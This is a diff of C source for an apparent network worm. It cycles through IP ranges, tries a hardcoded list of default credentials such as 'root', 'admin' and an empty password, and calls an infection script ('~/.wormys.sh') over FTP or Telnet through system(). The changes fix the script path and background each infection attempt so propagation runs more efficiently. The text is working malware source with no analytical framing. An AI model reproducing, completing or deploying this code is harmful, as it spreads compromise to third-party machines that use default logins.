@@ -76,7 +76,7 @@ int main(int argc, char **argv)
 	char *passlist[4] = {"root", "password", "", "admin"};
 	char *user = malloc(BUFSIZ);
 	char *pass = malloc(BUFSIZ);
-	char *infectionCode[1] = {"~.wormys.sh"};
+	char *infectionCode[1] = {"~/.wormys.sh"};
 	int i, j, p, k;
 	pop:
 	for (i = 0; i < 254; i++)
@@ -103,7 +103,7 @@ int main(int argc, char **argv)
 							sprintf(command, "%s ftp", infectionCode[0]);
 						else if (pa[p]==23)// Telnet
 							sprintf(command, "%s telnet", infectionCode[0]);
-						sprintf(command, "%s %s %s %d.%d.%d.%d", command, user, pass, ij[0], ij[1], i, j);
+						sprintf(command, "%s %s %s %d.%d.%d.%d&", command, user, pass, ij[0], ij[1], i, j);
 						system(command);
 						sleep(rand() % maxWait/2);
 					}
